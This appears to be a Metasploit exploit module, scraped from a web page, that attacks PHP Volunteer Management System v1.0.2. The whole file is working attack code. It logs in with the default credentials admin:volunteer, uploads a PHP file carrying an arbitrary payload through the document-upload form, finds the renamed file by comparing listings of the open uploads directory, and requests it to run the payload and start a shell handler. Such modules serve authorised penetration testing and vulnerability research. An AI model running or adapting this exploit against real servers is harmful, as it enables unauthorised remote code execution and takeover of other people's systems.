# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "PHP Volunteer Management System v1.0.2 Arbitrary File Upload Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in PHP Volunteer Management System,
        version v1.0.2 or prior.  This application has an upload feature that allows an
        authenticated user to upload anything to the &#039;uploads&#039; directory, which is actually
        reachable by anyone without a credential.  An attacker can easily abuse this upload
        functionality first by logging in with the default credential (admin:volunteer),
        upload a malicious payload, and then execute it by sending another GET request.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Ashoo <ashoo.online[at]gmail.com>&#039;,
          &#039;sinn3r&#039; #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;18941&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;PHP Volunteer Management 1.0.2&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "May 28 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the web application&#039;, &#039;/bf102/&#039;]),
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;The username to login&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;The password to login&#039;, &#039;volunteer&#039;])
      ], self.class)
  end


  #
  # Login to the web application.
  # When you send the very first request to the app, you&#039;re assigned with a cookie called
  # &#039;PHPVolunteerManagent&#039;.  This is something you must keep, because after authentication,
  # that same cookie becomes your auth token.
  #
  def login(base, username, password)
    # Get cookie: PHPVolunteerManagent
    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "#{base}index.php"
    })

    # If we don&#039;t get a cookie, bail!
    if res and res.headers[&#039;Set-Cookie&#039;] =~ /(PHPVolunteerManagent=\w+);*/
      cookie = $1
      vprint_status("#{@peer} - Found cookie: #{cookie}")
    else
      return nil
    end

    # Find the location for login
    login_location = res.headers[&#039;Location&#039;] || &#039;?p=login&#039;

    # And then login!
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => "#{base}index.php#{login_location}",
      &#039;cookie&#039;    => cookie,
      &#039;vars_post&#039; => {
        &#039;volunteer_email&#039;    => username,
        &#039;volunteer_password&#039; => password,
        &#039;submit&#039;             => &#039;Login!&#039;
      }
    })

    # If the app wants to redirect us to the dashboard, we
    # assume the login was successful
    if res and res.headers[&#039;Location&#039;] =~ /\?p\=dashboard/
      return cookie
    else
      return nil
    end
  end


  #
  # Upload the payload as a personal document.
  # This will save the file in: mods/documents/uploads/
  # And then we return the HTTP response, which should contain some message indicating
  # whether we successfully uploaded the file, or not.
  #
  def upload(base, cookie, fname, file, description)
    boundary = "----WebKitFormBoundary#{rand_text_alpha(10)}"

    endpoint = "#{rhost}"
    endpoint << ":#{rport}" if rport.to_i != 80

    data_post  = "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"file\"; filename=\"#{fname}\"\r\n"
    data_post << "Content-Type: text/php\r\n"
    data_post << "\r\n"
    data_post << file
    data_post << "\r\n"
    data_post << "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"description\"\r\n"
    data_post << "\r\n"
    data_post << description
    data_post << "\r\n"
    data_post << "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"submit\"\r\n"
    data_post << "\r\n"
    data_post << "Submit"
    data_post << "\r\n"
    data_post << "--#{boundary}--\r\n"

    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => "#{base}index.php?p=upload_personal_document",
      &#039;cookie&#039;  => cookie,
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{boundary}",
      &#039;data&#039;    => data_post,
      &#039;headers&#039; => {
        &#039;Referer&#039; => "http://#{endpoint}#{base}index.php?p=upload_personal_document"
      }
    })

    return res
  end


  #
  # Find all the new files from the &#039;uploads&#039; directory.
  # This trick is necessary, because when we upload a file, our filename
  # is renamed to something else with a timestamp.  Since we cannot reliability
  # guess what the filename is going to be, we can at least compare both before/after
  # snapshots to figure it out.
  #
  def get_my_file(before, after)
    r = /\<td\>\<a href\=\"(\d{4}\-\d{2}\-\d{2}\_\d+\-\d+\-\d+\_\d+\.\w+)">\d{4}\-\d{2}\-\d{2}\_\d+\-\d+\-\d+\_\d+\.\w+\<\/a\>\<\/td\>/
    b = (before.scan(r) || []).flatten
    a = (after.scan(r)  || []).flatten

    # Return all the new uploads
    return a - b
  end


  #
  # This function will return the raw HTTP response like a snapshot,
  # which later can be used for comparision.
  #
  def peek_uploads(base, cookie)
    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "#{base}mods/documents/uploads/",
      &#039;cookie&#039; => cookie
    })

    return res
  end


  #
  # The exploit function does exploity things
  #
  def exploit
    base = target_uri.path
    base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;

    @peer = "#{rhost}:#{rport}"

    # Login
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
    cookie = login(base, username, password)
    if cookie.nil?
      print_error("#{@peer} - Login failed with \"#{username}:#{password}\"")
      return
    end

    print_status("#{@peer} - Login successful with #{username}:#{password}")

    # Take a snapshot of the uploads directory
    # Viewing this doesn&#039;t actually require the user to login first,
    # but we supply the cookie anyway to act more like a real user.
    print_status("#{@peer} - Enumerating all the uploads...")
    before = peek_uploads(base, cookie)
    if before.nil?
      print_error("#{@peer} - Unable to enumerate original uploads")
      return
    end

    # Upload our PHP shell
    print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length.to_s} bytes)")
    fname = rand_text_alpha(rand(10)+6) + &#039;.php&#039;
    desc  = rand_text_alpha(rand(10)+5)
    php   = %Q|<?php #{payload.encoded} ?>|
    res = upload(base, cookie, fname, php, desc)
    if res.nil? or res.body !~ /The file was successfuly uploaded/
      print_error("#{@peer} - Failed to upload our file")
      return
    end

    # Now that we&#039;ve uploaded our shell, let&#039;s take another snapshot
    # of the uploads directory.
    print_status("#{@peer} - Enumerating new uploads...")
    after = peek_uploads(base, cookie)
    if after.nil?
      print_error("#{@peer} - Unable to enumerate latest uploads")
      return
    end

    # Find the filename of our uploaded shell
    files = get_my_file(before.body, after.body)
    if files.empty?
      print_error("#{@peer} - No new file(s) found. The upload probably failed.")
      return
    else
      vprint_status("#{@peer} - Found these new files: #{files.inspect}")
    end

    # There might be more than 1 new file, at least execute the first 10
    # just to make sure.  Don&#039;t want to try too many either.
    counter = 0
    files.each do |f|
      counter += 1
      break if counter > 10
      print_status("Trying file: #{f}")
      send_request_raw({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "#{base}mods/documents/uploads/#{f}",
        &#039;cookie&#039; => cookie
      })
    end

    handler
  end
end



